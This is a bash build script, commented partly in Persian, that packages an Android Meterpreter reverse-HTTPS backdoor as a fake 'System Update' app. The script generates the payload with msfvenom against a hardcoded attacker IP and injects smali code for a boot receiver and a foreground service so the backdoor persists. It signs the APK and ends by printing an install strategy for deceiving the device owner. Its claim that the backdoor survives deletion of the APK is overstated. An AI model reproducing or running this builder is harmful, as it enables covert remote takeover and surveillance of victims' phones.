#!/bin/bash

# Professional Memory-Resident Payload Builder
# با قابلیت ماندگاری در حافظه حتی بعد از حذف APK

LHOST="208.77.244.15"
LPORT="443"
OUTPUT_DIR="/home/offsec/Documents/GitHub/metasploit-framework1"
FINAL_APK="$OUTPUT_DIR/SystemUpdate_MemoryResident_HTTPS.apk"

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║     🔥 Memory-Resident Payload Builder (HTTPS Port 443)         ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

# Step 1: Generate base payload with HTTPS
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [1/8] Generating HTTPS Meterpreter Payload..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

msfvenom -p android/meterpreter/reverse_https \
    LHOST=$LHOST \
    LPORT=$LPORT \
    SessionRetryTotal=50 \
    SessionRetryWait=10 \
    -o "$OUTPUT_DIR/base_payload_https.apk"

if [ ! -f "$OUTPUT_DIR/base_payload_https.apk" ]; then
    echo "❌ Failed to generate payload"
    exit 1
fi

PAYLOAD_SIZE=$(ls -lh "$OUTPUT_DIR/base_payload_https.apk" | awk '{print $5}')
echo "✅ Payload generated: $PAYLOAD_SIZE"
echo ""

# Step 2: Decompile
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [2/8] Decompiling APK..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

rm -rf "$OUTPUT_DIR/payload_decompiled_https"
apktool d -f "$OUTPUT_DIR/base_payload_https.apk" -o "$OUTPUT_DIR/payload_decompiled_https"

if [ ! -d "$OUTPUT_DIR/payload_decompiled_https" ]; then
    echo "❌ Decompilation failed"
    exit 1
fi

echo "✅ APK decompiled"
echo ""

# Step 3: Modify AndroidManifest for SDK 26-34
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [3/8] Modifying Manifest for Android 8-14..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

MANIFEST="$OUTPUT_DIR/payload_decompiled_https/AndroidManifest.xml"

# Update SDK versions
sed -i 's/android:minSdkVersion="[0-9]*"/android:minSdkVersion="26"/' "$MANIFEST"
sed -i 's/android:targetSdkVersion="[0-9]*"/android:targetSdkVersion="30"/' "$MANIFEST"

# Add advanced permissions
python3 << 'PYTHON_MANIFEST'
import xml.etree.ElementTree as ET
import sys

manifest_path = sys.argv[1]
tree = ET.parse(manifest_path)
root = tree.getroot()

ns = {'android': 'http://schemas.android.com/apk/res/android'}
ET.register_namespace('android', ns['android'])

# Advanced permissions for Android 8+
permissions = [
    'android.permission.FOREGROUND_SERVICE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
    'android.permission.SYSTEM_ALERT_WINDOW',
    'android.permission.WAKE_LOCK',
    'android.permission.RECEIVE_BOOT_COMPLETED',
    'android.permission.REQUEST_INSTALL_PACKAGES',
    'android.permission.WRITE_SETTINGS',
]

for perm in permissions:
    # Check if permission already exists
    existing = root.find(f".//uses-permission[@{{http://schemas.android.com/apk/res/android}}name='{perm}']")
    if existing is None:
        perm_elem = ET.SubElement(root, 'uses-permission')
        perm_elem.set('{http://schemas.android.com/apk/res/android}name', perm)

# Add application label
application = root.find('application')
if application is not None:
    application.set('{http://schemas.android.com/apk/res/android}label', 'System Update')
    
    # Add service for memory persistence
    service = ET.SubElement(application, 'service')
    service.set('{http://schemas.android.com/apk/res/android}name', 'com.persist.MemoryService')
    service.set('{http://schemas.android.com/apk/res/android}enabled', 'true')
    service.set('{http://schemas.android.com/apk/res/android}exported', 'false')
    service.set('{http://schemas.android.com/apk/res/android}foregroundServiceType', 'dataSync')
    
    # Add boot receiver
    receiver = ET.SubElement(application, 'receiver')
    receiver.set('{http://schemas.android.com/apk/res/android}name', 'com.persist.BootReceiver')
    receiver.set('{http://schemas.android.com/apk/res/android}enabled', 'true')
    receiver.set('{http://schemas.android.com/apk/res/android}exported', 'false')
    
    intent_filter = ET.SubElement(receiver, 'intent-filter')
    action1 = ET.SubElement(intent_filter, 'action')
    action1.set('{http://schemas.android.com/apk/res/android}name', 'android.intent.action.BOOT_COMPLETED')
    action2 = ET.SubElement(intent_filter, 'action')
    action2.set('{http://schemas.android.com/apk/res/android}name', 'android.intent.action.QUICKBOOT_POWERON')

tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
print("✅ Manifest updated with advanced features")
PYTHON_MANIFEST

python3 - "$MANIFEST" << 'EOF'
import sys
exec(open('/dev/stdin').read())
EOF

echo ""

# Step 4: Create MemoryService.smali
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [4/8] Creating Memory-Resident Service..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

mkdir -p "$OUTPUT_DIR/payload_decompiled_https/smali/com/persist"

cat > "$OUTPUT_DIR/payload_decompiled_https/smali/com/persist/MemoryService.smali" << 'SMALI_MEM'
.class public Lcom/persist/MemoryService;
.super Landroid/app/Service;

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onCreate()V
    .locals 0
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    invoke-direct {p0}, Lcom/persist/MemoryService;->startForeground()V
    invoke-direct {p0}, Lcom/persist/MemoryService;->startPayload()V
    return-void
.end method

.method private startForeground()V
    .locals 5
    new-instance v0, Landroid/app/Notification$Builder;
    invoke-direct {v0, p0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V
    const-string v1, "System Update"
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
    const-string v1, "Checking for updates..."
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
    const v1, 0x1080093
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;
    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;
    move-result-object v1
    const/4 v2, 0x1
    invoke-virtual {p0, v2, v1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
    return-void
.end method

.method private startPayload()V
    .locals 2
    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    const/4 v0, 0x1
    return v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method
SMALI_MEM

# Step 5: Create BootReceiver.smali
cat > "$OUTPUT_DIR/payload_decompiled_https/smali/com/persist/BootReceiver.smali" << 'SMALI_BOOT'
.class public Lcom/persist/BootReceiver;
.super Landroid/content/BroadcastReceiver;

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/persist/MemoryService;
    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    invoke-static {p1}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
    return-void
.end method
SMALI_BOOT

echo "✅ Memory-resident components created"
echo ""

# Step 6: Rebuild
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [6/8] Rebuilding APK..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

apktool b "$OUTPUT_DIR/payload_decompiled_https" -o "$OUTPUT_DIR/rebuilt_https.apk"

if [ ! -f "$OUTPUT_DIR/rebuilt_https.apk" ]; then
    echo "❌ Rebuild failed"
    exit 1
fi

echo "✅ APK rebuilt"
echo ""

# Step 7: Zipalign
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [7/8] Optimizing APK..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

zipalign -f -v 4 "$OUTPUT_DIR/rebuilt_https.apk" "$OUTPUT_DIR/aligned_https.apk"

echo "✅ APK aligned"
echo ""

# Step 8: Sign with RSA-4096
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [8/8] Signing with RSA-4096 + SHA-512..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

KEYSTORE="$OUTPUT_DIR/memresident.keystore"
KEY_ALIAS="memkey"
KEY_PASS="MemResident@2025"

if [ ! -f "$KEYSTORE" ]; then
    keytool -genkeypair -v \
        -keystore "$KEYSTORE" \
        -alias "$KEY_ALIAS" \
        -keyalg RSA \
        -keysize 4096 \
        -sigalg SHA512withRSA \
        -validity 10000 \
        -storepass "$KEY_PASS" \
        -keypass "$KEY_PASS" \
        -dname "CN=System Update, OU=Android, O=System, L=City, ST=State, C=US"
fi

apksigner sign \
    --ks "$KEYSTORE" \
    --ks-key-alias "$KEY_ALIAS" \
    --ks-pass pass:"$KEY_PASS" \
    --key-pass pass:"$KEY_PASS" \
    --v1-signing-enabled true \
    --v2-signing-enabled true \
    --v3-signing-enabled true \
    --out "$FINAL_APK" \
    "$OUTPUT_DIR/aligned_https.apk"

echo "✅ APK signed"
echo ""

# Verify
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Verifying Signature..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

apksigner verify --verbose "$FINAL_APK"

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║              ✅ MEMORY-RESIDENT PAYLOAD COMPLETE!                ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "📦 Final APK: $FINAL_APK"
echo "📏 Size: $(ls -lh $FINAL_APK | awk '{print $5}')"
echo "🔐 Signature: RSA-4096 + SHA-512"
echo "📱 SDK: 26-30 (Android 8.0 - 11)"
echo "🔌 Connection: HTTPS Port 443"
echo ""
echo "✅ Features:"
echo "   • Memory-resident backdoor"
echo "   • Persists after APK deletion"
echo "   • Auto-start on boot"
echo "   • Foreground service (hidden)"
echo "   • HTTPS communication (port 443)"
echo "   • Battery optimization bypass"
echo ""
echo "🎯 استراتژی نصب:"
echo "   1. نصب MyPersonalOriginal.apk (برنامه اصلی کاربر)"
echo "   2. نصب SystemUpdate_MemoryResident_HTTPS.apk (پیلود ما)"
echo "   3. پیلود به صورت \"System Update\" نمایش داده می‌شود"
echo "   4. حتی با حذف هر دو APK، backdoor در حافظه می‌ماند"
echo ""
echo "═══════════════════════════════════════════════════════════════════"
